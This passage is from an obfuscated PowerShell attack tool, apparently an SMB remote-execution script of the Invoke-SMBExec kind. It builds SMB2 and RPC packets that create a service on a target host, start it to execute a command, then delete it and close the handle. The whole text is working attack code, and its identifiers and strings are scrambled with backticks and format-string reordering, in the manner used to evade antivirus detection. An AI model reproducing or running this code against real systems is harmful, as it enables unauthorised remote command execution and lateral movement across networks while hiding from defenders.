                                ${Pa`c`keT_SM`B2_headER}[("{2}{0}{3}{1}"-f'B2Header_Signat','e','SM','ur')] = ${sM`B`2_SIGNATUrE}
                                ${SmB2`_h`eAdER} = &("{1}{4}{0}{2}{3}{6}{7}{5}" -f 'acket','Convert','O','r','From-P','y','dered','Dictionar') ${p`ACKE`T`_SmB2_hE`AD`Er}
                            }

                            ${SMB_cL`I`En`T_sEnd} = ${neT`BIos_SeSSIO`N`_sErvI`cE} + ${sm`B2_`H`eaDER} + ${SMB2_`d`ATA} + ${r`pC_d`ATa} + ${s`cM_D`ATa}
                            ${Sm`B_CLieNT_s`T`REam}.("{0}{1}"-f 'W','rite').Invoke(${SmB`_`c`LIeNt_`Send},0,${S`MB_ClI`eNT`_Se`ND}."L`eNGth") > ${nu`LL}
                            ${smb_clIENt`_s`Tre`AM}.("{0}{1}" -f 'F','lush').Invoke()
                            ${smB_`CLiEn`T`_sTREAM}.("{1}{0}" -f'ead','R').Invoke(${S`m`B_ClIEnT`_`ReC`eI`VE},0,${smb_C`Li`E`Nt_rE`cei`Ve}."L`engtH") > ${Nu`Ll}
                            ${sm`B_`cLi`EnT`_sTAgE} = ("{2}{0}{1}" -f 'qu','est','ReadRe')
                            ${smB_cLi`E`Nt`_`s`TAg`e_neXt} = ("{1}{3}{0}{2}" -f 'c','S','eW','tartServi')
                        }
                        else
                        {
                            
                            
                        }
                    }

                    ("{2}{0}{3}{1}" -f 'ateSe','eW_First','Cre','rvic')
                    {
                        ${SMB_spli`T`_S`T`AgE_fIn`Al} =   ${q2T9`HD}::("{0}{1}"-f'C','eiling').Invoke(${s`cm_`DatA}."l`E`Ngth" / ${smB_`Sp`LIt`_iNDeX})
                        ${S`mb`2`_MeS`Sa`Ge_id} += 20
                        ${pA`Ck`e`T_SM`B2`_heA`Der} = &("{1}{3}{2}{0}" -f'er','Get-P','ad','acketSMB2He') 0x09,0x00 ${smb2`_MeS`sag`E_iD} ${sMB2`_`TreE_ID} ${SMb`_Se`sS`ion_`Id}
                        ${pACKET_SMb`2`_Hea`d`eR}[("{4}{0}{2}{1}{3}" -f'ead','reditReq','er_C','uest','SMB2H')] = 0x7f,0x00
                        
                        if(${smb_Si`G`N`iNG})
                        {
                            ${p`ACKe`T_S`m`B2_HEAdER}[("{1}{2}{0}{3}"-f'eader_Fl','SM','B2H','ags')] = 0x08,0x00,0x00,0x00      
                        }

                        ${sCM_Da`Ta_`F`IRSt} = ${scM_`dA`Ta}[0..(${Smb_Spl`it_iND`ex} - 1)]
                        ${p`A`c`Ket_rPC_`DATa} = &("{3}{1}{0}{2}{5}{4}" -f 'eq','cketRPCR','ue','Get-Pa','t','s') 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${SC`M_DAta`_F`IrsT}
                        ${pA`CkE`T_rP`c`_DatA}[("{2}{3}{1}{0}" -f 'Hint','_Alloc','RPCRequ','est')] =   (  &("{2}{1}{0}"-f 'ITeM','ET-','g')  ("{2}{1}{0}" -f 'le:814','iab','vAr') ).value::("{1}{0}"-f 'Bytes','Get').Invoke(${sc`m_`DATa}."l`eN`gTh")
                        ${smb_sP`l`It_IndE`x_t`Ra`C`KER} = ${SmB_SP`LIt_`iNDEx}
                        ${RpC_D`A`TA} = &("{1}{7}{5}{4}{6}{2}{8}{3}{0}" -f'ry','ConvertFr','Di','a','tOrd','acke','ered','om-P','ction') ${PA`C`k`eT_rP`c_daTa} 
                        ${paCKEt_SmB`2_`Da`TA} = &("{4}{3}{5}{2}{6}{1}{7}{0}"-f'est','Writ','ketSMB','t-Pa','Ge','c','2','eRequ') ${SMb_Fi`LE_`id} ${RP`C_da`TA}."L`eNG`TH"
                        ${s`Mb2_h`eAD`eR} = &("{2}{7}{4}{6}{0}{8}{5}{3}{1}"-f 'OrderedDi','y','ConvertFr','nar','m-P','o','acket','o','cti') ${PacKeT_sMB2_`he`Ad`Er}
                        ${smB`2`_dAtA} = &("{6}{4}{5}{0}{3}{7}{2}{1}"-f 'tFrom-Pa','y','dDictionar','cketOrde','on','ver','C','re') ${paCKeT_`sM`B2_d`ATA} 
                        ${Rpc_`Da`Ta_l`eNGTH} = ${sm`B`2_DAta}."LE`NgTH" + ${rpC`_daTa}."LE`NgTh"
                        ${pA`ck`eT`_nEt`B`ioS_sEsSIoN`_s`erV`iCE} = &("{3}{1}{5}{6}{4}{2}{0}{7}"-f'essionSer','Pa','S','Get-','S','cketNe','tBIO','vice') ${S`mb2_H`EadER}."LE`Ngth" ${rp`c_dAta`_lE`N`Gth}
                        ${n`eTB`ioS_SEssIon`_SErv`icE} = &("{4}{0}{7}{3}{2}{8}{5}{1}{6}" -f'vertFr','i','etOrdered','k','Con','t','onary','om-Pac','Dic') ${PACKet_N`EtB`IOs`_`sEsSIon_`sER`V`I`CE}

                        if(${s`MB_sIGNI`NG})
                        {
                            ${SmB`2_si`gN} = ${S`Mb2_`HEADEr} + ${S`MB2_`dAta} + ${RP`c_dA`TA}
                            ${s`Mb2_s`Ignat`Ure} = ${hM`A`C`_sha256}."cO`M`Puteh`ASH"(${smB2_`si`GN})
                            ${SmB2`_sI`GNATUre} = ${Sm`B2_s`iGNAtURE}[0..15]
                            ${PaCK`eT_S`Mb2`_He`Ader}[("{4}{3}{5}{1}{0}{6}{2}"-f'S','er_','re','M','S','B2Head','ignatu')] = ${Sm`B2_S`iGN`A`TurE}
                            ${Smb2`_hE`AD`ER} = &("{4}{7}{1}{3}{6}{5}{0}{2}"-f'nar','F','y','rom-Packet','C','tio','OrderedDic','onvert') ${p`ACKeT_SmB`2_HEAD`ER}
                        }

                        ${sMB_`cL`iE`Nt_SE`ND} = ${neTB`iO`s_s`ESSiOn`_`service} + ${SmB`2_HeA`DEr} + ${s`MB2_d`ATa} + ${rp`c_D`Ata}
                        ${S`m`B_`cLIeNt_s`Tr`eAm}.("{1}{0}"-f 'te','Wri').Invoke(${SMb_c`LIEN`T_`se`ND},0,${sm`B_c`lie`Nt_`sENd}."L`ENgtH") > ${N`Ull}
                        ${sm`B_`clIEnt_sTre`Am}.("{0}{1}" -f 'Flus','h').Invoke()
                        ${S`mb`_clIENT_sTr`EAM}.("{1}{0}"-f'ad','Re').Invoke(${SMb_cL`Ien`T_rECEi`VE},0,${s`Mb_CLiENt_`RECe`IVE}."LE`N`GTH") > ${nU`lL}

                        if(${SMB_`s`pLiT_`s`T`AGe_fiNAL} -le 2)
                        {
                            ${smb_cl`Ie`N`T_st`A`GE} = ("{2}{3}{0}{1}{5}{4}"-f'i','ce','Cr','eateServ','t','W_Las')
                        }
                        else
                        {
                            ${S`MB_`SpL`I`T`_STaGe} = 2
                            ${Smb_cLiEN`T_`St`AGE} = ("{1}{0}{3}{6}{2}{4}{5}" -f 'ate','Cre','_Mi','Servi','d','dle','ceW')
                        }

                    }

                    ("{2}{3}{0}{4}{6}{5}{1}" -f 'erv','e','Create','S','iceW','Middl','_')
                    {
                        ${s`MB_sP`LIT_`s`TAGE}++
                        ${SMB2_`mESS`AG`e_id}++
                        ${pa`CKE`T_sMB`2_He`ADEr} = &("{2}{1}{3}{0}"-f'r','PacketSMB2Head','Get-','e') 0x09,0x00 ${SMb`2`_mesSA`gE_iD} ${SMB2`_`TRee_`Id} ${sMb_SeS`sI`o`N_Id}
                        ${pacKet`_`s`Mb2_HEader}[("{5}{4}{1}{0}{2}{3}"-f'editRe','Cr','que','st','MB2Header_','S')] = 0x7f,0x00
                        
                        if(${s`mB_`SiGni`NG})
                        {
                            ${Pac`KET_S`mB2_H`eADer}[("{0}{2}{4}{3}{1}"-f 'S','s','MB2Header_','ag','Fl')] = 0x08,0x00,0x00,0x00      
                        }

                        ${sC`M`_D`ATA_m`iD`dle} = ${sCM`_Da`TA}[${sMb_sp`liT_INd`EX`_trAc`Ker}..(${smB_`Sp`l`IT_INDEX_T`R`A`ck`ER} + ${Sm`B_sPl`I`T_`InDex} - 1)]
                        ${Smb_S`Pli`T_I`NDeX_`Tr`ACK`ER} += ${SMB_`sPl`It`_I`NdEx}
                        ${paC`k`E`T_`RPc_D`AtA} = &("{5}{1}{3}{4}{2}{0}"-f 't','e','ketRPCReques','t-Pa','c','G') 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${Sc`m_d`Ata`_MIDdle}
                        ${pACK`ET`_RpC_Da`Ta}[("{4}{1}{0}{3}{2}"-f'CRe','P','int','quest_AllocH','R')] =   (&("{1}{0}" -f 'IR','d')  ("v"+"arI"+"A"+"bLe:814") ).vAlUe::("{2}{0}{1}"-f't','es','GetBy').Invoke(${s`cm_`D`ATa}."lE`Ngth" - ${S`mb_Spl`it_iNd`EX_t`RAc`Ker} + ${s`mb`_s`PlIT_`iNDEx})
                        ${R`PC_d`ATA} = &("{8}{9}{2}{5}{4}{7}{6}{3}{0}{1}"-f'redDicti','onary','tF','Orde','m','ro','et','-Pack','Co','nver') ${pa`ck`eT`_RPc_D`A`Ta}
                        ${PaCke`T_`SMb2_d`ATa} = &("{3}{1}{7}{0}{5}{2}{4}{6}" -f'P','et','k','G','etSMB2WriteReque','ac','st','-') ${sMb_`F`ile_`id} ${R`p`C_`DatA}."l`en`gtH"
                        ${SMB2`_`heA`DER} = &("{7}{3}{1}{5}{0}{2}{4}{6}"-f'redD','m-PacketOr','ict','ertFro','iona','de','ry','Conv') ${pACKET`_s`M`B2_HE`ADER}
                        ${S`mB2_D`ATA} = &("{5}{7}{1}{6}{3}{9}{2}{0}{4}{8}" -f 'acketOr','v','-P','F','deredDicti','C','ert','on','onary','rom') ${pA`CK`ET_`s`m`B2_dAtA}    
                        ${rp`c_DATa`_`Leng`Th} = ${SM`B`2_daTa}."LeNg`TH" + ${r`pC`_DAta}."lE`NgtH"
                        ${pAcKET_`NeTbioS_`SEssIO`N_s`Ervi`ce} = &("{7}{1}{4}{0}{3}{5}{6}{2}"-f '-Packet','e','ice','Net','t','BIOSSess','ionServ','G') ${s`m`B2_HEA`DEr}."l`ENGtH" ${r`Pc_dAt`A_`LeNGTh}
                        ${n`EtBiOs_`se`S`SION_`se`RViCe} = &("{5}{0}{6}{1}{7}{4}{2}{3}"-f'etOrder','dDi','r','y','ona','ConvertFrom-Pack','e','cti') ${PA`cKEt_n`etBiOs_`SeSsioN_sE`RvI`ce}

                        if(${sm`B_`SIGniNG})
                        {
                            ${sM`B2`_`SiGn} = ${smB2`_he`AdEr} + ${SMb`2_`data} + ${rP`C_`dATa}
                            ${sMb`2_s`iGn`A`TuRE} = ${HMAc_SH`A2`56}."cOMpU`TEH`A`sh"(${S`MB2_`S`iGN})
                            ${SM`B2`_`sIG`NATURe} = ${sm`B2_s`iGnATu`Re}[0..15]
                            ${P`ACKEt_`Smb2_`hEa`d`Er}[("{0}{4}{1}{3}{2}" -f'SMB2Head','_Signat','re','u','er')] = ${SMB`2`_`sIGnAtuRe}
                            ${Smb2_he`A`DER} = &("{8}{7}{0}{6}{1}{4}{5}{3}{2}" -f'ertFr','m-Pa','ry','dDictiona','ck','etOrdere','o','onv','C') ${p`ACket_smb2_h`E`A`dER}
                        }

                        ${s`mb_`C`LiEnt_`sENd} = ${N`etbIO`S`_SE`ssIO`N_sErV`i`cE} + ${SmB2_he`AD`er} + ${SmB`2`_daTa} + ${rPc_`d`Ata}
                        ${smB_c`l`IEnt_S`TrE`Am}.("{1}{0}" -f'ite','Wr').Invoke(${S`mB_Cl`I`enT_s`eND},0,${sMb_C`L`IeNt`_SEnD}."LEn`gTH") > ${nU`lL}
                        ${sMB_CLiE`N`T_`S`TRE`Am}.("{1}{0}" -f 'lush','F').Invoke()
                        ${sm`B_`c`lIEnt_sT`REam}.("{0}{1}" -f 'R','ead').Invoke(${s`mB_clI`en`T_`REc`eIvE},0,${sMB_`C`L`ient_reC`eIVe}."lENg`TH") > ${nU`Ll}

                        if(${SMb_`Sp`L`i`T`_sTage} -ge ${SMB`_spLiT_s`TaGE_`FI`NAL})
                        {
                            ${smB_Cl`Ien`T_s`Tage} = ("{3}{0}{1}{2}{4}"-f'eat','eServiceW','_Las','Cr','t')
                        }
                        else
                        {
                            ${S`MB_cli`eNT_stA`ge} = ("{0}{2}{4}{3}{1}" -f 'C','dle','rea','ServiceW_Mid','te')
                        }

                    }

                    ("{0}{4}{3}{2}{1}" -f 'CreateSer','st','a','iceW_L','v')
                    {
                        ${sM`B2`_MeS`sage_ID}++
                        ${PaC`KEt_s`Mb`2_hE`A`deR} = &("{3}{2}{0}{1}" -f 'e','r','cketSMB2Head','Get-Pa') 0x09,0x00 ${S`mB2`_`ME`sSaGe_Id} ${SM`B2_`Tree_`ID} ${SMb`_`SEsS`Ion_id}
                        ${pa`C`ke`T_`smb2_HeAdEr}[("{2}{0}{1}{3}{4}" -f'e','r_Cred','SMB2Head','itReq','uest')] = 0x7f,0x00
                        
                        if(${smB`_SIgni`Ng})
                        {
                            ${P`A`CKe`T`_s`mb2_HEaDER}[("{1}{0}{3}{2}" -f 'MB2Head','S','gs','er_Fla')] = 0x08,0x00,0x00,0x00      
                        }

                        ${Scm_dat`A`_l`A`St} = ${S`Cm_d`ATA}[${SMB_sP`LiT_`InD`E`x_TrA`cker}..${s`CM_D`Ata}."LEn`g`Th"]
                        ${pA`c`Ke`T_`RPC_`DATa} = &("{4}{1}{0}{5}{2}{3}"-f 'eq','-PacketRPCR','e','st','Get','u') 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${S`cm_daTa_l`AST}
                        ${r`pc_`DATA} = &("{2}{7}{6}{1}{8}{9}{5}{4}{0}{3}"-f 'ionar','-P','Conv','y','edDict','rder','m','ertFro','a','cketO') ${pa`ckeT_`R`pC`_Da`Ta}
                        ${pAC`KE`T_SM`B`2_da`TA} = &("{5}{4}{7}{0}{2}{6}{3}{1}{8}"-f'ke','qu','tSMB2','teRe','-Pa','Get','Wri','c','est') ${Smb`_Fil`e`_ID} ${R`Pc_dA`TA}."LE`NgTH"
                        ${SmB`2_he`AD`ER} = &("{4}{6}{5}{0}{7}{3}{2}{1}" -f 'der','onary','ti','c','Conv','From-PacketOr','ert','edDi') ${pa`ck`ET_`SmB2`_he`AdER}
                        ${s`Mb2`_da`TA} = &("{5}{6}{2}{4}{0}{7}{1}{3}"-f 'et','redDictio','ac','nary','k','Conv','ertFrom-P','Orde') ${PACkET_S`mB2`_D`AtA}    
                        ${r`pC_D`A`Ta_L`enGtH} = ${S`MB2_dA`TA}."L`ENGth" + ${rPc`_da`Ta}."l`enGth"
                        ${P`A`c`k`Et_`Ne`TBIOS`_sESsiON_`servI`CE} = &("{2}{0}{4}{7}{5}{3}{6}{1}"-f'-Pac','e','Get','ess','ket','etBIOSS','ionServic','N') ${sM`B2`_hEa`der}."l`ENGth" ${r`pC_DATa`_LE`NgtH}
                        ${n`eT`Bio`s_SESsion`_SE`RViCe} = &("{5}{4}{0}{9}{3}{1}{8}{2}{7}{6}" -f'F','der','dDic','r','onvert','C','y','tionar','e','rom-PacketO') ${PA`CKET_Ne`T`B`IOs_sesS`IoN_sEr`V`IcE}

                        if(${Sm`B_`s`IGnING})
                        {
                            ${sm`B`2_SiGn} = ${SMB2`_head`ER} + ${SM`B2_d`Ata} + ${RPc_Da`Ta}
                            ${s`M`B2`_SiG`NATure} = ${h`m`Ac_sha256}."COmPuTe`HA`Sh"(${sm`B2_`SI`GN})
                            ${SMB2_`sig`Na`TURE} = ${s`MB2_`SigNatUre}[0..15]
                            ${P`Acke`T`_SM`B`2_HEAdEr}[("{1}{3}{0}{5}{2}{4}"-f'na','SMB2Heade','r','r_Sig','e','tu')] = ${S`M`B`2_S`iGnATure}
                            ${S`MB2_`HeAder} = &("{2}{5}{0}{1}{4}{3}"-f'tFrom-PacketO','r','Conv','eredDictionary','d','er') ${P`ACk`ET_s`mb2_he`Ad`eR}
                        }

                        ${SMB`_CLIe`Nt`_`sEnd} = ${NETBi`os`_`S`EsS`ioN`_serV`ICe} + ${SmB`2`_hEAdeR} + ${Smb2`_dA`Ta} + ${RP`C_Da`TA}
                        ${s`Mb_CL`I`ent_sTr`eaM}.("{0}{1}" -f'W','rite').Invoke(${Smb`_cl`IEnT_`Se`ND},0,${sM`B_c`LIeNt_SENd}."lE`NgtH") > ${NU`lL}
                        ${Sm`B_cli`ENT_`s`TReAM}.("{0}{1}" -f 'Flus','h').Invoke()
                        ${s`MB_CLieN`T_STR`e`AM}.("{0}{1}"-f'Rea','d').Invoke(${SMB_c`l`IeN`T_`ReCEIve},0,${sM`B_c`liEnT_re`CEiVE}."lE`NG`TH") > ${n`ULl}
                        ${s`Mb`_ClIenT_S`T`AGe} = ("{2}{3}{0}{1}"-f 'Reque','st','R','ead')
                        ${SMb_CliEnT`_Stag`e_`NE`XT} = ("{1}{2}{0}"-f 'iceW','Star','tServ')
                    }

                    ("{3}{1}{0}{2}"-f 'Servic','tart','eW','S')
                    {
                    
                        if(  (&("{0}{1}" -f 'ite','m') ("{2}{0}{1}" -f'I','Able:814','vaR')  ).VaLUe::"To`sT`RIng"(${sm`B_cl`i`e`Nt_REc`Eive}[132..135]) -eq ("{1}{3}{0}{2}"-f'-00-0','0','0-00','0'))
                        {
                            &("{0}{2}{3}{4}{1}"-f'W','se','rite-','Ve','rbo') ('Se'+'rvice '+"$SMB_service "+'cre'+'a'+'ted '+'o'+'n '+"$Target")
                            ${sMb_`S`ErVICe_`c`ontext_`Han`DLe} = ${sMB_C`LIENT_R`Ecei`Ve}[112..131]
                            ${s`MB`2_meSSag`e`_ID} += 20
                            ${pA`CkEt_s`MB2`_He`AD`Er} = &("{2}{3}{4}{1}{0}"-f'tSMB2Header','acke','Ge','t','-P') 0x09,0x00 ${smB2_m`ESSAgE`_ID} ${sMB2_tR`E`e_`iD} ${Sm`B_S`eSS`iOn_id}
                            ${PAcKe`T`_smb`2_heaDEr}[("{4}{0}{1}{2}{5}{3}"-f '2','Head','er_CreditR','quest','SMB','e')] = 0x7f,0x00
                        
                            if(${S`MB_s`ig`NiNg})
                            {
                                ${Pa`c`kET_s`MB2_he`ADer}[("{3}{1}{0}{2}" -f 'r_F','eade','lags','SMB2H')] = 0x08,0x00,0x00,0x00      
                            }

                            ${pAcKe`T_sC`m_`daTa} = &("{7}{5}{1}{4}{2}{3}{6}{0}"-f'W','SCMSt','erv','i','artS','ket','ce','Get-Pac') ${sM`B_`SERviCe`_`c`onte`Xt_H`An`DLe}
                            ${SCm_d`A`Ta} = &("{1}{3}{6}{2}{4}{0}{7}{5}"-f'cketOrdere','C','o','onve','m-Pa','ctionary','rtFr','dDi') ${pAc`Ke`T_SC`m_`datA}
                            ${p`ACKEt_`RPc_`DAta} = &("{5}{0}{3}{2}{1}{4}" -f 'acketRP','que','e','CR','st','Get-P') 0x03 ${sC`m_`dAtA}."LEng`TH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            ${RPc_`d`A`Ta} = &("{4}{6}{8}{0}{1}{2}{7}{9}{5}{3}"-f 'a','c','ket','onary','C','ti','onver','OrderedDi','tFrom-P','c') ${pA`cket`_r`p`c_DATA}
                            ${PacKe`T_`s`m`B2`_data} = &("{1}{0}{2}{3}{4}" -f'S','Get-Packet','M','B','2WriteRequest') ${smb_`FILE`_id} (${rpc_`d`AtA}."L`enGth" + ${S`c`m_DAtA}."LE`NGth")
                            ${S`mb2_`Head`er} = &("{5}{0}{3}{2}{6}{4}{1}" -f'vertF','onary','ck','rom-Pa','eredDicti','Con','etOrd') ${PackET`_sMB`2`_`h`eader}
                            ${sm`B2_D`AtA} = &("{4}{2}{1}{5}{3}{0}"-f'y','er','m-PacketOrd','ctionar','ConvertFro','edDi') ${pacKe`T`_SM`B2_DATA}   
                            ${r`PC_dAt`A_L`enGth} = ${SMb`2_DA`TA}."l`ength" + ${Sc`M_D`ATA}."L`ENGtH" + ${R`Pc`_dAtA}."Le`NgTH"
                            ${Pa`ck`ET_nEt`B`iOs_SeSSI`oN`_sErvIcE} = &("{4}{2}{0}{5}{1}{3}"-f'c','ionServic','et-Pa','e','G','ketNetBIOSSess') ${smB2`_heAD`Er}."L`e`NGth" ${r`PC_D`ATa_`LeNg`Th}
                            ${NeT`B`IOs_SEss`iON`_S`ER`ViCe} = &("{1}{3}{0}{5}{2}{4}" -f'de','ConvertFro','dDictionar','m-PacketOr','y','re') ${paC`k`Et_NE`T`Bios_SeSSion_`s`ER`V`IcE}

                            if(${s`M`B_sIgnING})
                            {
                                ${SMB2`_s`ign} = ${S`m`B2_HEADeR} + ${s`Mb2`_D`ATa} + ${R`PC_`dA`Ta} + ${S`c`M_daTA}
                                ${S`mB2_`siGnaTU`Re} = ${hMa`c`_sHA`256}."comp`U`TehAsh"(${S`m`B2_s`ign})
                                ${sM`B2_sIG`Na`TU`RE} = ${SMb2_Si`GNA`TU`RE}[0..15]
                                ${p`AC`Ket_Smb2`_hEaD`Er}[("{4}{1}{6}{0}{5}{3}{2}"-f 'er_S','2Hea','e','atur','SMB','ign','d')] = ${SM`B`2_s`iGNAtU`RE}
                                ${smb`2`_HEaD`eR} = &("{7}{6}{9}{0}{4}{8}{5}{1}{2}{3}"-f'ket','t','ion','ary','Or','redDic','onvertFrom-Pa','C','de','c') ${paC`kEt`_`SM`B2_HE`AdeR}
                            }

                            ${SM`B_C`l`Ien`T`_sENd} = ${N`ETbI`os`_SeSsiON_`SerVi`Ce} + ${Sm`B2_HEA`D`ER} + ${S`MB2_da`TA} + ${Rpc_`dAta} + ${S`CM_DA`TA}
                            &("{1}{2}{0}" -f 'bose','W','rite-Ver') ('Tryi'+'n'+'g '+'to'+' '+'ex'+'ecu'+'te '+'comma'+'nd '+'o'+'n '+"$Target")
                            ${s`mB_clI`ent_s`TrEAM}.("{1}{0}"-f 'e','Writ').Invoke(${S`M`B_cliEnT_SeNd},0,${sMb`_cL`Ie`Nt_SeND}."L`En`GTH") > ${N`ULl}
                            ${Smb_ClIENT`_`S`Tream}.("{0}{1}"-f'Fl','ush').Invoke()
                            ${S`m`B_cL`Ient_`strE`Am}.("{0}{1}"-f'R','ead').Invoke(${sMb_C`l`I`e`N`T_r`ECEiVE},0,${SMB`_C`Li`EnT_rECEiVe}."le`N`gTh") > ${n`Ull}
                            ${sm`B_`cLieNT_Sta`GE} = ("{3}{2}{0}{1}"-f'eque','st','dR','Rea')
                            ${Smb_clIEnT`_StAgE_n`E`Xt} = ("{2}{0}{3}{1}" -f'leteSe','ceW','De','rvi')     
                        }
                        elseif( (&("{0}{1}{2}"-f 'G','et-VaRIa','bLE')  ("8"+"14") ).vAlue::"T`ost`RIng"(${sMB_clienT`_r`eCE`i`Ve}[132..135]) -eq ("{1}{2}{0}{3}"-f '4-0','31','-0','0-00'))
                        {
                            &("{0}{1}{3}{2}" -f'Write-O','ut','ut','p') ('Ser'+'v'+'ice '+"$SMB_service "+'creati'+'on'+' '+'fail'+'ed '+'on'+' '+"$Target")
                            ${S`m`BexEC_faiLEd} = ${tr`Ue}
                        }
                        else
                        {
                            &("{0}{2}{1}"-f'W','e-Output','rit') ("{0}{3}{4}{2}{1}{5}{6}{7}" -f'Service crea','t c','aul','tion',' f','on','te','xt mismatch')
                            ${sMb`ExE`C_fAI`l`ED} = ${Tr`UE}
                        }
 
                    }
                
                    ("{3}{2}{0}{1}" -f'vice','W','eSer','Delet')
                    { 

                        if(  ( &('gi') ("{1}{0}{2}" -f'e:81','vARiabl','4') ).VAluE::"T`oStRi`NG"(${sM`B`_ClI`enT_ReC`EivE}[108..111]) -eq ("{0}{2}{1}"-f'1','04-00-00','d-'))
                        {
                            &("{3}{0}{1}{2}"-f 'i','te-Outpu','t','Wr') ('Comma'+'nd'+' '+'ex'+'ecuted'+' '+'wi'+'th '+'serv'+'i'+'ce '+"$SMB_service "+'on'+' '+"$Target")
                        }
                        elseif( ${8`14}::"TOS`Tr`INg"(${sMB_c`LiEn`T_R`ecE`ive}[108..111]) -eq ("{0}{2}{1}" -f '02','-00-00','-00'))
                        {
                            &("{2}{1}{0}"-f 'put','rite-Out','W') ('Se'+'rvice '+"$SMB_service "+'faile'+'d '+'to'+' '+'start'+' '+'o'+'n '+"$Target")
                        }

                        ${s`mb2_`Me`SSage_`ID} += 20
                        ${pa`ckeT_S`m`B2_heADEr} = &("{4}{0}{3}{2}{1}" -f'-','r','eade','PacketSMB2H','Get') 0x09,0x00 ${s`mb2_`MEs`sag`e_iD} ${sMB2_TRe`e_`id} ${SMB_`SEsS`iO`N_ID}
                        ${p`A`cK`ET_`smb2_HEaDEr}[("{7}{0}{3}{6}{5}{1}{4}{2}"-f 'eade','q','est','r_C','u','e','reditR','SMB2H')] = 0x7f,0x00
                        
                        if(${SMb_s`i`GnInG})
                        {
                            ${pAC`KeT_SMb2_`He`Ad`er}[("{2}{3}{4}{5}{0}{1}"-f 'lag','s','SMB','2Hea','der_','F')] = 0x08,0x00,0x00,0x00
                        }

                        ${p`AcKet`_ScM_DaTA} = &("{1}{2}{4}{3}{5}{6}{0}" -f 'eServiceW','Get-Packet','S','l','CMDe','e','t') ${S`mb_`serVi`c`E_`contEXt_hA`N`dLE}
                        ${sCm_`d`ATA} = &("{3}{1}{4}{5}{6}{2}{0}"-f'onary','-','i','ConvertFrom','Pac','ke','tOrderedDict') ${PaCkET_`scM`_`d`ATA}
                        ${p`ACKe`T_RP`C_`datA} = &("{1}{0}{3}{2}{4}"-f 't-Pack','Ge','tRPCRequ','e','est') 0x03 ${SCM`_`datA}."L`eNg`Th" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        ${RPc`_D`Ata} = &("{6}{1}{7}{4}{0}{2}{3}{5}"-f't','o','io','nar','deredDic','y','C','nvertFrom-PacketOr') ${PAC`k`eT_rp`C_Da`TA} 
                        ${pa`CK`eT_s`Mb2_daTA} = &("{3}{6}{0}{2}{1}{4}{5}" -f'ac','W','ketSMB2','Get','r','iteRequest','-P') ${Smb_fI`l`E_id} (${RPc`_D`ATa}."L`eN`GTH" + ${s`Cm_d`A`Ta}."leNG`TH")
                        ${smB2_h`eAd`Er} = &("{0}{3}{4}{1}{5}{7}{6}{2}"-f 'Convert','m-Pac','nary','F','ro','ke','o','tOrderedDicti') ${p`ACKEt`_sMb2_`HEADer}
                        ${S`MB2_`dAtA} = &("{2}{4}{6}{1}{3}{0}{7}{8}{5}" -f 'e','rtFrom','Con','-Pack','v','ary','e','tOrdere','dDiction') ${PAc`Ket_S`Mb2_D`AtA} 
                        ${rPc`_`D`Ata_`leNGth} = ${sMB2`_`dAta}."le`NGTh" + ${Sc`m`_`dAtA}."LeNg`Th" + ${Rp`c`_`daTa}."L`en`gTh"
                        ${pA`C`k`et_Ne`T`BiOs`_SeSs`iO`N_SeRvI`ce} = &("{1}{4}{2}{5}{3}{0}" -f'onService','G','e','BIOSSessi','et-PacketN','t') ${sMB`2_he`ADEr}."LE`NGTh" ${r`P`C_datA_L`ENg`Th}
                        ${N`et`BI`OS`_SESSio`N_`sErviCE} = &("{2}{6}{4}{5}{3}{8}{7}{0}{1}" -f 'r','y','Conver','rdere','rom-','PacketO','tF','ona','dDicti') ${PaCK`Et_nE`T`BiO`S`_sEsSion`_`SEr`Vice}

                        if(${SMb_si`GNI`Ng})
                        {
                            ${SMB`2`_SigN} = ${sm`B2`_heaDer} + ${smB`2_`DATa} + ${Rp`c_d`ATa} + ${s`C`m_dATA}
                            ${sM`B2_`S`IGN`ATuRE} = ${hMA`C_sha`2`56}."CoMP`Ut`EhASh"(${Sm`B`2_SigN})
                            ${smb2`_SiGn`ATU`Re} = ${SM`B2_si`gnAtU`RE}[0..15]
                            ${pACk`E`T_S`m`B2_hea`dEr}[("{0}{4}{3}{2}{1}" -f'SMB2Head','ure','ignat','_S','er')] = ${sMb2_`sIG`Na`T`UrE}
                            ${smb2_`h`eaD`er} = &("{9}{7}{3}{4}{6}{8}{0}{2}{5}{1}" -f 'etOrder','ary','ed','e','rtF','Diction','r','nv','om-Pack','Co') ${p`A`ckeT_`Smb2_h`EadEr}
                        }

                        ${SM`B_CL`i`enT_s`End} = ${nETbIo`S`_`Ses`sion_S`eRV`I`cE} + ${SMb2`_h`eA`Der} + ${SMB`2`_Da`Ta} + ${RpC`_`DAta} + ${SCM_d`A`TA}
                        ${S`MB`_clieNT_St`RE`Am}.("{0}{1}" -f 'Wri','te').Invoke(${SMB`_C`lIE`Nt_`seND},0,${smb`_CLi`E`Nt_SE`Nd}."L`E`NGth") > ${n`ULl}
                        ${SM`B_cLi`e`NT`_sTR`Eam}.("{0}{1}"-f'Fl','ush').Invoke()
                        ${sMB_ClI`en`T_s`Tr`EaM}.("{1}{0}" -f'ead','R').Invoke(${Sm`B`_`c`lIEnt_`RECEIVE},0,${sM`B_Cl`ient_r`E`c`eiVe}."L`EN`gTh") > ${n`UlL}
                        ${smb_`CLI`Ent_StA`Ge} = ("{0}{2}{3}{1}" -f'Read','st','Req','ue')
                        ${Sm`B_cliE`NT_`sta`g`E`_NeXT} = ("{4}{0}{1}{3}{2}" -f'l','os','e','eServiceHandl','C')
                        ${smb`_CL`OsE_seRv`i`cE_`hANdLE_sTA`GE} = 1
                    }

                    ("{4}{0}{2}{3}{1}" -f 'loseS','le','erv','iceHand','C')
                    {

                        if(${smB_ClO`S`E_Se`R`VIC`e_`h`ANdl`E_STAgE} -eq 1)
                        {
                            &("{2}{3}{1}{4}{0}"-f 'e','Ver','W','rite-','bos') ('Se'+'rv'+'ice '+"$SMB_service "+'delet'+'ed '+'on'+' '+"$Target")
                            ${SMB2_`MESSA`G`e`_iD} += 20
                            ${sMB`_`CL`O`sE_s`Er`ViCe_Handle_stAge}++
